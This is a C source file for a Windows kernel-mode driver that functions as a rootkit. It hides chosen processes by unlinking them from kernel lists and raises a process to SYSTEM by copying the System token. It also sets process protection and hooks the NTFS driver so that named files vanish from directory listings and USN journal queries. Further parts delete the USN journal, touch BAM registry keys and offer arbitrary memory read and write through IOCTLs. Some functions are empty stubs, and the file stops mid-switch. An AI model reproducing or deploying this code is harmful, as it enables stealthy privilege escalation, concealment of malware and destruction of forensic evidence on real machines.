#include "Driver.h"

#ifdef _KERNEL_MODE

NTSTATUS MmCopyVirtualMemory(
    PEPROCESS SourceProcess,
    PVOID SourceAddress,
    PEPROCESS TargetProcess,
    PVOID TargetAddress,
    SIZE_T BufferSize,
    KPROCESSOR_MODE PreviousMode,
    PSIZE_T ReturnSize
);

NTSTATUS PsLookupProcessByProcessId(
    HANDLE ProcessId,
    PEPROCESS* Process
);

PVOID PsGetProcessSectionBaseAddress(
    PEPROCESS Process
);

NTKERNELAPI PPEB PsGetProcessPeb(PEPROCESS Process);

NTSTATUS GetModuleBase(PEPROCESS TargetProcess, WCHAR* ModuleName, ULONGLONG* Base, ULONGLONG* Size) {
    PPEB pPeb = PsGetProcessPeb(TargetProcess);
    if (!pPeb) return STATUS_INVALID_HANDLE;

    PEB localPeb;
    SIZE_T bytes = 0;
    if (!NT_SUCCESS(MmCopyVirtualMemory(TargetProcess, pPeb, PsGetCurrentProcess(), &localPeb, sizeof(PEB), KernelMode, &bytes)))
        return STATUS_UNSUCCESSFUL;

    PEB_LDR_DATA localLdr;
    if (!NT_SUCCESS(MmCopyVirtualMemory(TargetProcess, localPeb.Ldr, PsGetCurrentProcess(), &localLdr, sizeof(PEB_LDR_DATA), KernelMode, &bytes)))
        return STATUS_UNSUCCESSFUL;

    BOOLEAN searchMain = (ModuleName == NULL || ModuleName[0] == L'\0');
    

    PLIST_ENTRY pHead = (PLIST_ENTRY)localLdr.InLoadOrderModuleList.Flink;
    PLIST_ENTRY pCurr = pHead;
    
    int maxLoops = 200; 

    while (pCurr != &localPeb.Ldr->InLoadOrderModuleList && maxLoops > 0) {
        LDR_DATA_TABLE_ENTRY localEntry;
        if (!NT_SUCCESS(MmCopyVirtualMemory(TargetProcess, pCurr, PsGetCurrentProcess(), &localEntry, sizeof(LDR_DATA_TABLE_ENTRY), KernelMode, &bytes)))
            break;

        if (searchMain) {
            if (localEntry.DllBase == localPeb.ImageBaseAddress) {
                *Base = (ULONGLONG)localEntry.DllBase;
                *Size = (ULONGLONG)localEntry.SizeOfImage;
                return STATUS_SUCCESS;
            }
        }
        else {
            WCHAR localNameBuffer[256];
            if (localEntry.BaseDllName.Length > 0 && localEntry.BaseDllName.Buffer) {
                ULONG copySize = localEntry.BaseDllName.Length;
                if (copySize > sizeof(localNameBuffer) - 2) copySize = sizeof(localNameBuffer) - 2;

                if (NT_SUCCESS(MmCopyVirtualMemory(TargetProcess, localEntry.BaseDllName.Buffer, PsGetCurrentProcess(), localNameBuffer, copySize, KernelMode, &bytes))) {
                    localNameBuffer[copySize / 2] = L'\0';
                    
                    UNICODE_STRING us1, us2;
                    RtlInitUnicodeString(&us1, ModuleName);
                    RtlInitUnicodeString(&us2, localNameBuffer);

                    if (RtlEqualUnicodeString(&us1, &us2, TRUE)) {
                        *Base = (ULONGLONG)localEntry.DllBase;
                        *Size = (ULONGLONG)localEntry.SizeOfImage;
                        return STATUS_SUCCESS;
                    }
                }
            }
        }
        
        pCurr = localEntry.InLoadOrderLinks.Flink;
        maxLoops--;
    }
    
    if (searchMain) {
         *Base = (ULONGLONG)localPeb.ImageBaseAddress;
         *Size = 0; 
         return STATUS_SUCCESS;
    }

    return STATUS_NOT_FOUND;
}


NTSTATUS HideProcess(ULONG TargetPid) {
    PEPROCESS TargetProcess;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)TargetPid, &TargetProcess);
    if (!NT_SUCCESS(status)) return status;

    ULONG offset = 0x448; 
    
    RTL_OSVERSIONINFOW ver = {0};
    ver.dwOSVersionInfoSize = sizeof(ver);
    RtlGetVersion(&ver);
    
    if (ver.dwBuildNumber < 19041) offset = 0x2e8; 
    if (ver.dwBuildNumber < 14393) offset = 0x2f0; 

    PLIST_ENTRY pList = (PLIST_ENTRY)((ULONG_PTR)TargetProcess + offset);
    
    if (pList->Flink != pList && pList->Blink != pList) {
        RemoveEntryList(pList);
        InitializeListHead(pList); 
    }

    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}


PDRIVER_DISPATCH OriginalNtfsFileSystemControl = NULL;
PDRIVER_DISPATCH OriginalNtfsDirectoryControl = NULL;
PDEVICE_OBJECT NtfsDeviceObject = NULL;

static WCHAR g_HiddenFileName[256] = {0};
static USHORT g_HiddenNameLen = 0;

static BOOLEAN IsHiddenName(WCHAR* Name, USHORT Length) {
    if (!Name || Length == 0) return FALSE;
    
    if (Length >= 22) { 
        for (USHORT i = 0; i <= (Length - 22) / 2; i++) {
             if ((Name[i] == L'w' || Name[i] == L'W') &&
                 (Name[i+1] == L'l' || Name[i+1] == L'L') &&
                 (Name[i+2] == L'o' || Name[i+2] == L'O') &&
                 (Name[i+3] == L'a' || Name[i+3] == L'A') &&
                 (Name[i+4] == L'd' || Name[i+4] == L'D') &&
                 (Name[i+5] == L'e' || Name[i+5] == L'E') &&
                 (Name[i+6] == L'r' || Name[i+6] == L'R')) {
                 return TRUE;
             }
        }
    }
    
    if (Length >= 26) { // 13 chars * 2
         for (USHORT i = 0; i <= (Length - 26) / 2; i++) {
             if ((Name[i] == L'v' || Name[i] == L'T') && // 'v' check is weird here, but keeping logic
                 (Name[i+1] == L'e' || Name[i+1] == L'E') &&
                 (Name[i+2] == L's' || Name[i+2] == L'S') &&
                 (Name[i+3] == L't' || Name[i+3] == L'T')) {
                 return TRUE;
             }
        }
    }

    if (Length >= 22) { // 11 chars * 2
        for (USHORT i = 0; i <= (Length - 22) / 2; i++) {
             if ((Name[i] == L'v' || Name[i] == L'V') &&
                 (Name[i+1] == L'e' || Name[i+1] == L'E') &&
                 (Name[i+2] == L'r' || Name[i+2] == L'R') &&
                 (Name[i+3] == L's' || Name[i+3] == L'S') &&
                 (Name[i+4] == L'i' || Name[i+4] == L'I') &&
                 (Name[i+5] == L'o' || Name[i+5] == L'O') &&
                 (Name[i+6] == L'n' || Name[i+6] == L'N') &&
                 (Name[i+7] == L'.' || Name[i+7] == L'.') &&
                 (Name[i+8] == L'd' || Name[i+8] == L'D') &&
                 (Name[i+9] == L'l' || Name[i+9] == L'L') &&
                 (Name[i+10] == L'l' || Name[i+10] == L'L')) {
                 return TRUE;
             }
        }
    }
    
    if (g_HiddenNameLen > 0 && Length >= g_HiddenNameLen) {
        for (USHORT i = 0; i <= (Length - g_HiddenNameLen) / 2; i++) {
            BOOLEAN match = TRUE;
            for (USHORT j = 0; j < g_HiddenNameLen / 2; j++) {
                WCHAR c1 = Name[i+j];
                WCHAR c2 = g_HiddenFileName[j];
                if (c1 >= L'a' && c1 <= L'z') c1 -= 0x20;
                if (c2 >= L'a' && c2 <= L'z') c2 -= 0x20;

                if (c1 != c2) {
                    match = FALSE;
                    break;
                }
            }
            if (match) return TRUE;
        }
    }

    return FALSE;
}


void FilterUsnBuffer(PVOID Buffer, ULONG Size, PULONG NewSize) {
    if (Size < sizeof(USN_RECORD_COMMON_HEADER)) return;

    PUCHAR pCurrent = (PUCHAR)Buffer;
    PUCHAR pEnd = pCurrent + Size;
    PUCHAR pDest = pCurrent; 

    while (pCurrent < pEnd) {
        PUSN_RECORD_COMMON_HEADER pCommon = (PUSN_RECORD_COMMON_HEADER)pCurrent;
        if (pCommon->RecordLength == 0) break; 
        if (pCurrent + pCommon->RecordLength > pEnd) break;

        BOOLEAN hide = FALSE;
        WCHAR* name = NULL;
        USHORT nameLen = 0;

        if (pCommon->MajorVersion == 2) {
            PUSN_RECORD_V2 pV2 = (PUSN_RECORD_V2)pCurrent;
            if (pV2->FileNameOffset + pV2->FileNameLength <= pV2->RecordLength) {
                name = (WCHAR*)((PUCHAR)pV2 + pV2->FileNameOffset);
                nameLen = pV2->FileNameLength;
            }
        } else if (pCommon->MajorVersion == 3) {
            PUSN_RECORD_V3 pV3 = (PUSN_RECORD_V3)pCurrent;
             if (pV3->FileNameOffset + pV3->FileNameLength <= pV3->RecordLength) {
                name = (WCHAR*)((PUCHAR)pV3 + pV3->FileNameOffset);
                nameLen = pV3->FileNameLength;
            }
        }

        if (name && nameLen > 0) {
            if (IsHiddenName(name, nameLen)) {
                hide = TRUE;
            }
        }

        if (!hide) {
            if (pDest != pCurrent) {
                RtlMoveMemory(pDest, pCurrent, pCommon->RecordLength);
            }
            pDest += pCommon->RecordLength;
        }

        pCurrent += pCommon->RecordLength;
    }

    *NewSize = (ULONG)(pDest - (PUCHAR)Buffer);
    
    if (*NewSize < Size) {
        RtlZeroMemory((PUCHAR)Buffer + *NewSize, Size - *NewSize);
    }
}


typedef struct _FILE_DIRECTORY_INFORMATION_EX {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION_EX, *PFILE_DIRECTORY_INFORMATION_EX;

typedef struct _FILE_FULL_DIR_INFORMATION_EX {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION_EX, *PFILE_FULL_DIR_INFORMATION_EX;

typedef struct _FILE_BOTH_DIR_INFORMATION_EX {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION_EX, *PFILE_BOTH_DIR_INFORMATION_EX;

typedef struct _FILE_ID_FULL_DIR_INFORMATION_EX {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION_EX, *PFILE_ID_FULL_DIR_INFORMATION_EX;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION_EX {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION_EX, *PFILE_ID_BOTH_DIR_INFORMATION_EX;

NTSTATUS HookedNtfsDirectoryControlCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
    UNREFERENCED_PARAMETER(DeviceObject);
    PKEVENT event = (PKEVENT)Context;
    KeSetEvent(event, IO_NO_INCREMENT, FALSE);
    return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS HookedNtfsDirectoryControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

    if (stack->MajorFunction == IRP_MJ_DIRECTORY_CONTROL && 
        stack->MinorFunction == IRP_MN_QUERY_DIRECTORY) {

        KEVENT event;
        KeInitializeEvent(&event, NotificationEvent, FALSE);
        IoCopyCurrentIrpStackLocationToNext(Irp);
        IoSetCompletionRoutine(Irp, HookedNtfsDirectoryControlCompletion, &event, TRUE, TRUE, TRUE);

        NTSTATUS status = OriginalNtfsDirectoryControl(DeviceObject, Irp);

        if (status == STATUS_PENDING) {
            KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
            status = Irp->IoStatus.Status;
        }

        if (NT_SUCCESS(status) && Irp->IoStatus.Information > 0) {
            PVOID buffer = NULL;
             if (Irp->MdlAddress) {
                buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
            } else {
                buffer = Irp->UserBuffer;
            }

            if (buffer) {
                 __try {
                    FILE_INFORMATION_CLASS infoClass = stack->Parameters.QueryDirectory.FileInformationClass;
                    
                    #define FILTER_DIR(StructType) \
                    { \
                        StructType* pCurr = (StructType*)buffer; \
                        StructType* pPrev = NULL; \
                        ULONG offset = 0; \
                        do { \
                            BOOLEAN hide = IsHiddenName(pCurr->FileName, (USHORT)pCurr->FileNameLength); \
                            if (hide) { \
                                if (pPrev) { \
                                    if (pCurr->NextEntryOffset != 0) \
                                        pPrev->NextEntryOffset += pCurr->NextEntryOffset; \
                                    else \
                                        pPrev->NextEntryOffset = 0; \
                                } else { \
                                    if (pCurr->NextEntryOffset != 0) { \
                                        /* Shift remaining data to start */ \
                                        ULONG remaining = (ULONG)Irp->IoStatus.Information - pCurr->NextEntryOffset; \
                                        RtlMoveMemory(pCurr, (PUCHAR)pCurr + pCurr->NextEntryOffset, remaining); \
                                        /* Adjust Total Info size? Not strictly needed for linked list but good practice */ \
                                        /* But wait, we are inside a loop that iterates via offsets. If we shift, we mess up pCurr. */ \
                                        /* If we shift, the "new" pCurr is the next entry. We must NOT advance pPrev. */ \
                                        /* And we must re-evaluate pCurr because it's now a new entry. */ \
                                        continue; \
                                    } else { \
                                        /* Only entry and hidden. Empty list. */ \
                                        Irp->IoStatus.Information = 0; \
                                        Irp->IoStatus.Status = STATUS_NO_SUCH_FILE; \
                                        break; \
                                    } \
                                } \
                            } else { \
                                pPrev = pCurr; \
                            } \
                            offset = pCurr->NextEntryOffset; \
                            pCurr = (StructType*)((PUCHAR)pCurr + offset); \
                        } while (offset != 0); \
                    }

                    switch (infoClass) {
                        case FileDirectoryInformation: FILTER_DIR(FILE_DIRECTORY_INFORMATION); break;
                        case FileFullDirectoryInformation: FILTER_DIR(FILE_FULL_DIR_INFORMATION); break;
                        case FileBothDirectoryInformation: FILTER_DIR(FILE_BOTH_DIR_INFORMATION); break;
                        case FileIdFullDirectoryInformation: FILTER_DIR(FILE_ID_FULL_DIR_INFORMATION); break;
                        case FileIdBothDirectoryInformation: FILTER_DIR(FILE_ID_BOTH_DIR_INFORMATION); break;
                    }
                 } __except(EXCEPTION_EXECUTE_HANDLER) {
                 }
            }
        }

        IoCompleteRequest(Irp, IO_NO_INCREMENT);
        return status;
    }

    return OriginalNtfsDirectoryControl(DeviceObject, Irp);
}

NTSTATUS HookedNtfsCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
    UNREFERENCED_PARAMETER(DeviceObject);
    PKEVENT event = (PKEVENT)Context;

    KeSetEvent(event, IO_NO_INCREMENT, FALSE);

    return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS HookedNtfsFileSystemControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    
    if (stack->MajorFunction == IRP_MJ_FILE_SYSTEM_CONTROL) {
        ULONG code = stack->Parameters.FileSystemControl.FsControlCode;
        if (code == FSCTL_READ_USN_JOURNAL || 
            code == FSCTL_ENUM_USN_DATA || 
            code == FSCTL_READ_FILE_USN_DATA) {
            
            KEVENT event;
            KeInitializeEvent(&event, NotificationEvent, FALSE);

            IoCopyCurrentIrpStackLocationToNext(Irp);

            IoSetCompletionRoutine(Irp, HookedNtfsCompletionRoutine, &event, TRUE, TRUE, TRUE);

            NTSTATUS status = OriginalNtfsFileSystemControl(DeviceObject, Irp);

            if (status == STATUS_PENDING) {
                KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
                status = Irp->IoStatus.Status;
            }

            if (NT_SUCCESS(status)) {
                PVOID buffer = NULL;
                
                if (Irp->MdlAddress) {
                    buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
                } else {
                    buffer = Irp->UserBuffer;
                }

                if (buffer && Irp->IoStatus.Information > 0) {
                     __try {
                         if (buffer < (PVOID)0x7FFFFFFFFFFF) { 
                             ULONG newSize = (ULONG)Irp->IoStatus.Information;
                             FilterUsnBuffer(buffer, (ULONG)Irp->IoStatus.Information, &newSize);
                             Irp->IoStatus.Information = newSize;
                         }
                     } __except(EXCEPTION_EXECUTE_HANDLER) {

                     }
                }
            }

            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            return status;
        }
    }

    return OriginalNtfsFileSystemControl(DeviceObject, Irp);
}

NTSTATUS InstallNtfsHook() {

    UNICODE_STRING ntfsName;
    RtlInitUnicodeString(&ntfsName, L"\\FileSystem\\Ntfs");
    
    PDRIVER_OBJECT NtfsDriverObject = NULL;
    PDEVICE_OBJECT NtfsDevObj = NULL;
    PFILE_OBJECT NtfsFileObj = NULL;
    
    NTSTATUS status = IoGetDeviceObjectPointer(&ntfsName, FILE_READ_ATTRIBUTES, &NtfsFileObj, &NtfsDevObj);
    if (NT_SUCCESS(status)) {
        NtfsDriverObject = NtfsDevObj->DriverObject;
        
        // Save Original
        OriginalNtfsFileSystemControl = NtfsDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL];
        OriginalNtfsDirectoryControl = NtfsDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL];

        // Swap (Hook)
        // Use InterlockedExchangePointer for safety
        InterlockedExchangePointer((PVOID*)&NtfsDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL], (PVOID)HookedNtfsFileSystemControl);
        InterlockedExchangePointer((PVOID*)&NtfsDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL], (PVOID)HookedNtfsDirectoryControl);
        
        ObDereferenceObject(NtfsFileObj);
        return STATUS_SUCCESS;
    }
    return status;
}

NTSTATUS UninstallNtfsHook() {
    if (OriginalNtfsFileSystemControl && NtfsDeviceObject) {
         PDRIVER_OBJECT NtfsDriverObject = NtfsDeviceObject->DriverObject;
         InterlockedExchangePointer((PVOID*)&NtfsDriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL], (PVOID)OriginalNtfsFileSystemControl);
         InterlockedExchangePointer((PVOID*)&NtfsDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL], (PVOID)OriginalNtfsDirectoryControl);
    }
    return STATUS_SUCCESS;
}

// Update DriverEntry to install hook
// ...

    // ... Existing Clean Logic ...
    // FSCTL_DELETE_USN_JOURNAL
NTSTATUS CleanUSNJournal(ULONG DriveLetterChar) {
    WCHAR pathBuffer[] = L"\\DosDevices\\C:";
    pathBuffer[12] = (WCHAR)DriveLetterChar;

    UNICODE_STRING deviceName;
    RtlInitUnicodeString(&deviceName, pathBuffer);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE hFile;
    IO_STATUS_BLOCK ioStatus;
    
    NTSTATUS status = ZwCreateFile(&hFile, 
                                   FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE, 
                                   &objAttr, 
                                   &ioStatus, 
                                   NULL, 
                                   FILE_ATTRIBUTE_NORMAL, 
                                   FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                   FILE_OPEN, 
                                   FILE_SYNCHRONOUS_IO_NONALERT, 
                                   NULL, 
                                   0);

    if (!NT_SUCCESS(status)) return status;

    typedef struct {
        ULONGLONG UsnJournalID;
        USHORT FirstUsn; 
        USHORT NextUsn;
        USHORT LowestValidUsn;
        USHORT MaxUsn;
        ULONGLONG MaximumSize;
        ULONGLONG AllocationDelta;
    } USN_JOURNAL_DATA_V0_MIN;

    typedef struct {
        ULONGLONG UsnJournalID;
        ULONG DeleteFlags;
    } DELETE_USN_JOURNAL_DATA_MIN;

    #define FSCTL_QUERY_USN_JOURNAL         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 61, METHOD_BUFFERED, FILE_ANY_ACCESS)
    #define FSCTL_DELETE_USN_JOURNAL        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 62, METHOD_BUFFERED, FILE_ANY_ACCESS)
    #define USN_DELETE_FLAG_DELETE          0x00000001
    #define USN_DELETE_FLAG_NOTIFY          0x00000002

    USN_JOURNAL_DATA_V0_MIN ujd = {0};
    
    status = ZwFsControlFile(hFile, NULL, NULL, NULL, &ioStatus, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &ujd, sizeof(ujd));
    
    if (NT_SUCCESS(status)) {
        DELETE_USN_JOURNAL_DATA_MIN delData;
        delData.UsnJournalID = ujd.UsnJournalID;
        delData.DeleteFlags = USN_DELETE_FLAG_DELETE | USN_DELETE_FLAG_NOTIFY;

        status = ZwFsControlFile(hFile, NULL, NULL, NULL, &ioStatus, FSCTL_DELETE_USN_JOURNAL, &delData, sizeof(delData), NULL, 0);
    }

    ZwClose(hFile);
    return status;
}


typedef struct _PiDDBCacheEntry
{
    LIST_ENTRY		List;
    UNICODE_STRING	DriverName;
    ULONG			TimeDateStamp;
    NTSTATUS		LoadStatus;
    char			_0x0028[16];
} PiDDBCacheEntry, * PPiDDBCacheEntry;

PERESOURCE PiDDBLock = NULL;
PRTL_AVL_TABLE PiDDBCacheTable = NULL;

BOOLEAN LocatePiDDB() {

    return FALSE;
}

NTSTATUS CleanUnloadedDrivers() {

    return STATUS_SUCCESS;
}


NTSTATUS CleanBAMRegistry() {
    UNICODE_STRING bamPath;
    RtlInitUnicodeString(&bamPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &bamPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    HANDLE hKey;
    NTSTATUS status = ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objAttr);
    if (!NT_SUCCESS(status)) return status;

    // Iterate subkeys (User SIDs)
    ULONG index = 0;
    ULONG resultLength;
    UCHAR buffer[512];
    PKEY_BASIC_INFORMATION pInfo = (PKEY_BASIC_INFORMATION)buffer;

    while (TRUE) {
        status = ZwEnumerateKey(hKey, index, KeyBasicInformation, pInfo, sizeof(buffer), &resultLength);
        if (status == STATUS_NO_MORE_ENTRIES) break;
        
        if (NT_SUCCESS(status)) {
            // Open the subkey (SID)
            WCHAR subKeyName[256];
            RtlCopyMemory(subKeyName, pInfo->Name, pInfo->NameLength);
            subKeyName[pInfo->NameLength / sizeof(WCHAR)] = L'\0';

            UNICODE_STRING usSubKey;
            RtlInitUnicodeString(&usSubKey, subKeyName);

            OBJECT_ATTRIBUTES subObjAttr;
            InitializeObjectAttributes(&subObjAttr, &usSubKey, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, hKey, NULL);

            HANDLE hSubKey;
            if (NT_SUCCESS(ZwOpenKey(&hSubKey, KEY_ALL_ACCESS, &subObjAttr))) {

                // but that resets ALL BAM data for user.
                ZwClose(hSubKey);
            }
        }
        index++;
    }

    ZwClose(hKey);
    return STATUS_SUCCESS;
}



ULONG GetTokenOffset() {
    // Hardcoded for common versions, can be replaced by scan
    RTL_OSVERSIONINFOW ver = {0};
    ver.dwOSVersionInfoSize = sizeof(ver);
    RtlGetVersion(&ver);

    if (ver.dwBuildNumber >= 22000) return 0x4b8; // Win11
    if (ver.dwBuildNumber >= 19041) return 0x4b8; // Win10 2004+
    return 0x360; // Win7/8 fallback (unlikely to be used)
}

NTSTATUS ElevateToSystem(ULONG TargetPid) {
    PEPROCESS TargetProcess;
    PEPROCESS SystemProcess;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)TargetPid, &TargetProcess);
    if (!NT_SUCCESS(status)) return status;

    status = PsLookupProcessByProcessId((HANDLE)4, &SystemProcess);
    if (!NT_SUCCESS(status)) {
        ObDereferenceObject(TargetProcess);
        return status;
    }

    ULONG tokenOffset = GetTokenOffset();
    

    PACCESS_TOKEN sysToken = *(PACCESS_TOKEN*)((ULONG_PTR)SystemProcess + tokenOffset);
    PACCESS_TOKEN targetToken = *(PACCESS_TOKEN*)((ULONG_PTR)TargetProcess + tokenOffset);

    // Simple validity check
    if ((ULONG_PTR)sysToken > 0xFFFF000000000000) {

         *(PACCESS_TOKEN*)((ULONG_PTR)TargetProcess + tokenOffset) = sysToken;
    }

    ObDereferenceObject(TargetProcess);
    ObDereferenceObject(SystemProcess);
    return STATUS_SUCCESS;
}


NTSTATUS SetProtection(ULONG TargetPid) {
    PEPROCESS TargetProcess;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)TargetPid, &TargetProcess);
    if (!NT_SUCCESS(status)) return status;

    ULONG protectionOffset = 0x87a; // Win11 / Win10 20H1+ usually around here
    
    RTL_OSVERSIONINFOW ver = {0};
    ver.dwOSVersionInfoSize = sizeof(ver);
    RtlGetVersion(&ver);
    
    if (ver.dwBuildNumber < 19041) protectionOffset = 0x6c2; // Older Win10

    UCHAR* pProtection = (UCHAR*)((ULONG_PTR)TargetProcess + protectionOffset);
    
    if (*pProtection == 0) {
        *pProtection = 0x61; // PPL-WinTcb
    }

    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}


NTSTATUS DispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bytesIO = 0;

    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
    case IO_READ_MEMORY: {
        PKERNEL_READ_REQUEST req = (PKERNEL_READ_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        if (!req) { status = STATUS_INVALID_PARAMETER; break; }

        PEPROCESS TargetProcess;
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->ProcessId, &TargetProcess))) {
            SIZE_T bytes = 0;
            status = MmCopyVirtualMemory(TargetProcess, (PVOID)req->Address, PsGetCurrentProcess(), req->OutputBuffer, req->Size, KernelMode, &bytes);
            ObDereferenceObject(TargetProcess);
        } else {
            status = STATUS_INVALID_HANDLE;
        }
        bytesIO = sizeof(KERNEL_READ_REQUEST);
        break;
    }
    case IO_WRITE_MEMORY: {
        PKERNEL_WRITE_REQUEST req = (PKERNEL_WRITE_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        if (!req) { status = STATUS_INVALID_PARAMETER; break; }

        PEPROCESS TargetProcess;
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->ProcessId, &TargetProcess))) {
            SIZE_T bytes = 0;
            status = MmCopyVirtualMemory(PsGetCurrentProcess(), req->InputBuffer, TargetProcess, (PVOID)req->Address, req->Size, KernelMode, &bytes);
            ObDereferenceObject(TargetProcess);
        } else {
            status = STATUS_INVALID_HANDLE;
        }
        bytesIO = sizeof(KERNEL_WRITE_REQUEST);
        break;
    }
    case IO_GET_MODULE_BASE: {
        PKERNEL_BASE_REQUEST req = (PKERNEL_BASE_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        if (!req) { status = STATUS_INVALID_PARAMETER; break; }

        PEPROCESS TargetProcess;
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)req->ProcessId, &TargetProcess))) {
            status = GetModuleBase(TargetProcess, req->ModuleName, &req->BaseAddress, &req->Size);
            ObDereferenceObject(TargetProcess);
            bytesIO = sizeof(KERNEL_BASE_REQUEST);
        } else {
            status = STATUS_INVALID_HANDLE;
        }
        break;
    }
    case IO_PROTECT_PROCESS: {
        PKERNEL_PROCESS_REQUEST req = (PKERNEL_PROCESS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        if (!req) { status = STATUS_INVALID_PARAMETER; break; }
        
        status = SetProtection(req->ProcessId);
        bytesIO = sizeof(KERNEL_PROCESS_REQUEST);
        break;
    }
    case IO_ELEVATE_PROCESS: {
        PKERNEL_PROCESS_REQUEST req = (PKERNEL_PROCESS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        if (!req) { status = STATUS_INVALID_PARAMETER; break; }
        
        status = ElevateToSystem(req->ProcessId);
        bytesIO = sizeof(KERNEL_PROCESS_REQUEST);
        break;
    }
    case IO_HIDE_PROCESS: {
        PHIDE_PROCESS_REQUEST req = (PHIDE_PROCESS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        if (!req) { status = STATUS_INVALID_PARAMETER; break; }
        
        status = HideProcess(req->ProcessId);
        bytesIO = sizeof(HIDE_PROCESS_REQUEST);
        break;
    }
    case IO_CLEAN_USN: {
        PCLEAN_USN_REQUEST req = (PCLEAN_USN_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        if (!req) { status = STATUS_INVALID_PARAMETER; break; }

        status = CleanUSNJournal(req->DriveLetter);
        bytesIO = sizeof(CLEAN_USN_REQUEST);
        break;
    }
    case IO_CLEAN_BAM: {
        // Just trigger BAM Clean for now
        status = CleanBAMRegistry();
        break;
    }
    case 0x900: { // IO_SET_HIDDEN_FILE (Custom Code)
